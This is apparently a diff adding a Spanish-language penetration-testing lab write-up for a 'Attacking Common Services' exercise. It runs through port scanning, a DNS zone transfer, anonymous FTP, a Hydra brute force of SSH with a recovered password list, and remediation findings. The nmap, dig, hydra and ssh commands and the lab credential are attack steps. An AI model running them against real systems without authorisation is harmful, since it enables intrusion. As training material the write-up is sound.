@@ -127,3 +127,193 @@ La flag se obtiene desde el escritorio del `Administrator`, ya que el proceso de
 - Usuario de base de datos sobreprivilegiado (`ALL PRIVILEGES` + `FILE`) para lo que debería ser una cuenta de aplicación.
 - `secure_file_priv` permisivo (default de XAMPP), que permitió el `INTO OUTFILE` hacia el webroot.
 - Apache corriendo con privilegios elevados, pudiendo leer el directorio del Administrator sin escalada.
+
+---
+# Attacking Common Services - Medium
+The second server is an internal server (within the inlanefreight.htb domain) that manages and stores emails and files and serves as a backup of some of the company's processes. From internal conversations, we heard that this is used relatively rarely and, in most cases, has only been used for testing purposes so far.
+### Assess the target server and find the flag.txt file. Submit the contents of this file as your answer.
+
+**IP:** 10.129.50.101  
+**OS:** Linux Ubuntu  
+**Dificultad:** Medium  
+**Módulo:** Attacking Common Services
+## Resumen ejecutivo
+
+Máquina Linux con cinco servicios expuestos: SSH, DNS (BIND), POP3/POP3S (Dovecot), y dos instancias de FTP en puertos no estándar (2121 y 30021). El compromiso se logró por una **cadena de enumeración DNS + acceso anónimo FTP + reutilización de credenciales**:
+
+1. Zone transfer AXFR reveló el mapa completo de la infraestructura interna.
+2. FTP anónimo en puerto 30021 (descubierto por escaneo completo de puertos) expuso un archivo con contraseñas candidatas y el nombre de usuario `simon`.
+3. Fuerza bruta de SSH con esas contraseñas dio acceso directo a la máquina donde estaba la flag.
+
+**Lección clave de esta máquina:** siempre lanzar un escaneo completo de 65535 puertos (`-p-`) en paralelo con el escaneo rápido inicial — el puerto 30021 no aparece en el top-1000 de nmap y se habría perdido sin eso.
+## 1. Enumeración
+
+### Escaneo de puertos (inicial)
+
+```
+sudo nmap -Pn -sV -sC -v 10.129.50.101 -T4 -oA medium
+```
+
+Servicios identificados:
+
+| Puerto | Servicio | Versión | Nota |
+|--------|----------|---------|------|
+| 22 | SSH | OpenSSH 8.2p1 (Ubuntu) | Vía de entrada final |
+| 53 | DNS | ISC BIND 9.16.1 | Zone transfer objetivo |
+| 110 | POP3 | Dovecot pop3d | Con STLS |
+| 995 | POP3S | Dovecot pop3d (SSL) | POP3 cifrado |
+| 2121 | FTP | ProFTPD "InlaneFTP" | Puerto no estándar |
+
+> [!Important] 
+> El escaneo inicial no usó `-p-` (todos los puertos). El puerto **30021** (FTP anónimo, el vector real de entrada) no fue detectado hasta un escaneo posterior. Para los siguientes labs, lanzar siempre el escaneo completo en paralelo:
+> ```shell
+> sudo nmap -Pn -p- --open -T4 10.129.50.101 -oA full_scan &
+> ```
+
+
+### Escaneo completo (corrección)
+
+Detectado posteriormente:
+
+| Puerto | Servicio | Nota |
+|--------|----------|------|
+| 30021 | FTP | ProFTPD — **login anónimo activo** |
+## 2. Enumeración DNS — Zone Transfer (AXFR)
+
+El puerto 53 con BIND activo es un candidato inmediato para zone transfer. El banner del ProFTPD ("InlaneFTP") sugería el dominio `inlanefreight.htb`:
+
+```
+dig AXFR @10.129.50.101 inlanefreight.htb
+```
+
+Resultado — zona transferida exitosamente (11 registros):
+
+```
+inlanefreight.htb.         SOA   inlanefreight.htb. root.inlanefreight.htb.
+inlanefreight.htb.         NS    ns.inlanefreight.htb.
+app.inlanefreight.htb.     A     10.129.200.5
+dc1.inlanefreight.htb.     A     10.129.100.10
+dc2.inlanefreight.htb.     A     10.129.200.10
+int-ftp.inlanefreight.htb. A     127.0.0.1       ← FTP interno (= ProFTPD en 2121)
+int-nfs.inlanefreight.htb. A     10.129.200.70
+ns.inlanefreight.htb.      A     127.0.0.1
+un.inlanefreight.htb.      A     10.129.200.142
+ws1.inlanefreight.htb.     A     10.129.200.101
+ws2.inlanefreight.htb.     A     10.129.200.102
+wsus.inlanefreight.htb.    A     10.129.200.80
+```
+
+**Hallazgo clave:** `int-ftp.inlanefreight.htb → 127.0.0.1` correlaciona con el ProFTPD en puerto 2121 — un servicio marcado como "interno" pero accesible desde fuera.
+## 3. Exploración POP3 (110)
+
+```
+telnet 10.129.50.101 110
+```
+
+POP3 (Dovecot) no soporta `VRFY`/`EXPN` — esos son comandos de **SMTP**, no de POP3. El protocolo POP3 solo valida credenciales con `USER`/`PASS`, no permite enumeración de usuarios sin credenciales. Bloqueado por falta de usuarios válidos en este punto.
+## 4. Exploración ProFTPD puerto 2121
+
+### Login anónimo
+Denegado.
+### Fingerprinting del servidor
+
+El banner muestra `220 ProFTPD Server (InlaneFTP)` — `InlaneFTP` es el `ServerName` personalizado de la config, **no la versión**. Para obtener las capacidades reales hay que conectarse con `nc -C` (flag de CRLF — sin ella el servidor ignora los comandos):
+
+```
+nc -C 10.129.50.101 2121
+FEAT
+```
+
+Respuesta relevante:
+```
+211-SITE COPY
+211-SITE MKDIR
+211-SITE RMDIR
+211-SITE SYMLINK
+211-SITE UTIME
+```
+
+**Hallazgo: mod_copy activo** (`SITE COPY` en la lista de features) → **CVE-2015-3306**. Permite copiar archivos arbitrarios del sistema **sin autenticación**. Sin embargo, se pivotó al vector más directo (FTP anónimo en 30021) antes de explotar esto.
+
+> **Nota técnica:** `nc` plano a veces no manda CRLF (`\r\n`) al final de cada línea, que FTP exige. La flag `-C` de netcat fuerza CRLF y resuelve el problema. Alternativa: `telnet` (maneja CRLF por defecto) o `printf 'FEAT\r\n' | nc`.
+## 5. FTP anónimo — puerto 30021 (el vector real)
+
+```
+ftp anonymous@10.129.50.101 30021
+```
+
+```
+230 Login successful.
+```
+
+Login anónimo exitoso. Contenido del servidor:
+
+```
+simon/
+  mynotes.txt
+```
+
+Contenido de `mynotes.txt`:
+```
+234987123948729384293
++23358093845098
+ThatsMyBigDog
+Rock!ng#May
+Puuuuuh7823328
+8Ns8j1b!23hs4921smHzwn
+237oHs71ohls18H127!!9skaP
+238u1xjn1923nZGSb261Bs81
+```
+
+**Hallazgos:**
+- **Usuario:** `simon` (inferido del directorio `simon/`).
+- **Lista de contraseñas candidatas:** 8 entradas, algunas con caracteres especiales (`Rock!ng#May`, `8Ns8j1b!23hs4921smHzwn`) con aspecto de contraseñas reales.
+
+## 6. Fuerza bruta de credenciales
+
+Con usuario `simon` y la wordlist del archivo, se prueba contra todos los servicios disponibles.
+
+### POP3 (110)
+```
+hydra -l simon -P mynotes.txt 10.129.50.101 pop3 -t 4
+```
+Sin resultado.
+
+### SSH (22)
+```
+hydra -l simon -P mynotes.txt ssh://10.129.50.101
+```
+
+```
+[22][ssh] host: 10.129.50.101   login: simon   password: 8Ns8j1b!23hs4921smHzwn
+```
+
+Credencial válida: **`simon : 8Ns8j1b!23hs4921smHzwn`**
+## 7. Acceso SSH y flag
+
+```
+ssh simon@10.129.50.101
+# password: 8Ns8j1b!23hs4921smHzwn
+```
+
+Acceso obtenido. La flag estaba en el directorio home de simon.
+## Hallazgos de seguridad
+
+- **Zone transfer AXFR permitido públicamente** — BIND expone toda la infraestructura interna sin restricción. Configurar `allow-transfer { none; };` como política base.
+- **FTP anónimo en puerto no estándar (30021)** — expone archivos sensibles (lista de contraseñas de un usuario real) sin autenticación. Deshabilitar FTP anónimo.
+- **Contraseña de usuario en texto plano** — `mynotes.txt` contenía la contraseña real de SSH de `simon`. Nunca almacenar contraseñas en archivos planos, especialmente en servidores accesibles.
+- **ProFTPD con mod_copy activo (CVE-2015-3306)** — copia de archivos arbitrarios sin autenticación. Deshabilitar mod_copy si no es necesario o actualizar ProFTPD.
+- **Puerto no estándar como única "protección"** — el 30021 no aparece en el top-1000 de nmap, pero un escaneo completo (`-p-`) lo revela. La seguridad por oscuridad no es seguridad.
+
+## Cadena de ataque resumida
+
+```
+nmap -p- (escaneo completo) 
+  → puerto 30021 descubierto
+  → FTP anónimo → simon/mynotes.txt (passwords)
+  → hydra SSH con simon
+  → acceso SSH → flag
+  
+(paralelo) dig AXFR → mapa de infraestructura interna
+(paralelo) ProFTPD 2121 → mod_copy activo (CVE-2015-3306, no explotado)
+```
